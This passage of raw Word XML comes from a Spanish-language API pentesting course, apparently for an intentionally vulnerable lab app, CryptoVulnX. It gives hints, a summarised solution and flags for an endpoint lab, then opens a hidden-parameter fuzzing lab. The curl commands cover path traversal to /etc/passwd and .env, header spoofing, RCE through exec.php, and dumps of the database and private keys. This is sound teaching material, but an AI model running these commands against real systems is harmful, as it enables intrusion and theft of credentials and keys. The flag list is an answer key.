          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 1 - Fuzzing dirigido a admin/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ffuf -w wordlists/cryptovulnx-endpoints.txt \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -u $TARGET/api/v1/admin/FUZZ \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -e .php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -mc 200,401,403 -t 30</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Hits esperados: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>users.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (existia), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>transactions.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (existia), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>debug.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (existia), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>backup.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (NUEVO), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>exec.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (NUEVO), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>logs.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (NUEVO).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 2 - LFI en logs.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Path traversal hacia /etc/passwd</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v1/admin/logs.php?file=../../../../etc/passwd" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "X-Admin-Token: admin_dev_bypass_v1"</w:t>
        <w:br/>
        <w:br/>
        <w:t># O logs simulados</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v1/admin/logs.php?file=audit.log" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "X-Admin-Token: admin_dev_bypass_v1"</w:t>
        <w:br/>
        <w:br/>
        <w:t># Leer .env del docroot</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v1/admin/logs.php?file=/var/www/html/.env" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "X-Admin-Token: admin_dev_bypass_v1"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 3 - Health endpoint con XFF spoofing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Sin XFF - 403</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/api/v1/internal/health</w:t>
        <w:br/>
        <w:br/>
        <w:t># Con XFF interno - 200 + secrets</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/api/v1/internal/health \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "X-Forwarded-For: 127.0.0.1" | jq</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 4 - .git-rev (path con punto)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Curl debe respetar el punto en la URL</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v1/.git-rev"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Devuelve commit hash, branch, remote URL (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>gitlab.cryptovulnx.internal</w:t>
      </w:r>
      <w:r>
        <w:t>) y mensaje del ultimo commit.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i/>
          <w:color w:val="446688"/>
        </w:rPr>
        <w:t>Pista 5 - export.csv con extension custom</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s "$TARGET/api/v1/users/export.csv?key=export_2024" -o users.csv</w:t>
        <w:br/>
        <w:t>head users.csv</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion Resumida</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>TARGET=http://localhost:8080</w:t>
        <w:br/>
        <w:br/>
        <w:t># 1. Backup completo</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v1/admin/backup.php?token=backup_static_2024" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -o cryptovulnx_dump.sql &amp;&amp; head -50 cryptovulnx_dump.sql</w:t>
        <w:br/>
        <w:br/>
        <w:t># 2. RCE via exec.php</w:t>
        <w:br/>
        <w:t>curl -sX POST $TARGET/api/v1/admin/exec.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "X-Admin-Token: admin_dev_bypass_v1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -d '{"cmd":"cat /var/www/html/.env"}' | jq -r .output</w:t>
        <w:br/>
        <w:br/>
        <w:t># 3. LFI via logs.php</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v1/admin/logs.php?file=/etc/passwd" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "X-Admin-Token: admin_dev_bypass_v1"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 4. Health con secrets</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/api/v1/internal/health \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "X-Forwarded-For: 127.0.0.1" | jq '.tokens, .config'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 5. Private keys de TODOS</w:t>
        <w:br/>
        <w:t>curl -s $TARGET/api/v1/wallets/private-keys.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">     -H "X-Admin-Token: admin_dev_bypass_v1" | jq '.wallets'</w:t>
        <w:br/>
        <w:br/>
        <w:t># 6. Export CSV</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v1/users/export.csv?key=export_2024"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 7. Git rev (revela infra)</w:t>
        <w:br/>
        <w:t>curl -s "$TARGET/api/v1/.git-rev" | jq</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Flags</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>FLAG-ENDPOINT-01  -&gt; backup.php dump completo de DB</w:t>
        <w:br/>
        <w:t>FLAG-ENDPOINT-02  -&gt; logs.php LFI via ?file=</w:t>
        <w:br/>
        <w:t>FLAG-ENDPOINT-03  -&gt; exec.php RCE via X-Admin-Token</w:t>
        <w:br/>
        <w:t>FLAG-ENDPOINT-04  -&gt; internal/health filtra todos los tokens</w:t>
        <w:br/>
        <w:t>FLAG-ENDPOINT-05  -&gt; private-keys dump completo</w:t>
        <w:br/>
        <w:t>FLAG-ENDPOINT-06  -&gt; export.csv dump de usuarios</w:t>
        <w:br/>
        <w:t>FLAG-ENDPOINT-07  -&gt; .git-rev filtra commit y remote</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Como esto encadena con Fase 5 (Exploitation)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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Hallazgo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Habilita</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">RCE en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/admin/exec.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>LAB05 BFLA, LAB08 Misconfig</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">LFI en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/admin/logs.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t xml:space="preserve">Lectura de </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/var/www/html/.env</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/etc/passwd</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>database.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Backup completo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Pasar a offline cracking de hashes, robar private keys</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Health endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Pivotar a otros endpoints internos con tokens reales</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>git-rev</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> con remote</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Acceso al GitLab interno (no presente en lab, pero pista para post-explotacion)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Fase 4 - Metodologia</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>LAB 14 - Hidden Parameter Fuzzing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Fase de la Metodologia: 4 - PARAMETER FUZZING</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Objetivo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Aplicar la cuarta fase del pentest de API: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>descubrir parametros, headers y cookies aceptados por el servidor pero no documentados</w:t>
      </w:r>
      <w:r>
        <w:t>. Esta fase es la mas subestimada y la que mas hallazgos da en pentests reales.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Tipos de parametros ocultos que el alumno debe descubrir:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Query string</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>?debug=1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>?include=*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>?fields=*</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>?role=admin</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>?as_user_id=N</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>?bypass_rate_limit=1</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Body JSON</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> en POST (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>fee_override</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>skip_validation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>as_user_id</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>bypass_kyc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>rate_override</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Headers HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Debug-Token</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Forwarded-For</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Original-URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Real-IP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Api-Version</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Service-Token</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Admin-Token</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>X-Bypass-RateLimit</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cookies</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>debug_mode=1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>internal_user=admin</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>feature_flags=admin_panel,debug</w:t>
      </w:r>
      <w:r>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Los desarrolladores frecuentemente dejan parametros "internos" para QA, debugging o features no terminadas. Estos parametros:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>No aparecen en la documentacion publica</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>No se filtran en validaciones de entrada</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Modifican el comportamiento del endpoint (mas datos, bypass de auth, dump de SQL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Sobreviven multiples deploys porque "no afectan" la API publica</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>CryptoVulnX implementa los 4 tipos en endpoints existentes para que el alumno aprenda a:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Usar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>arjun</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para descubrir query params</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Usar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>arjun --post</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para descubrir body params</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Usar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Param Miner</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Burp) para descubrir headers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Usar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>ffuf -H "Cookie: FUZZ=1"</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> para descubrir cookies</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Comparar respuestas (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
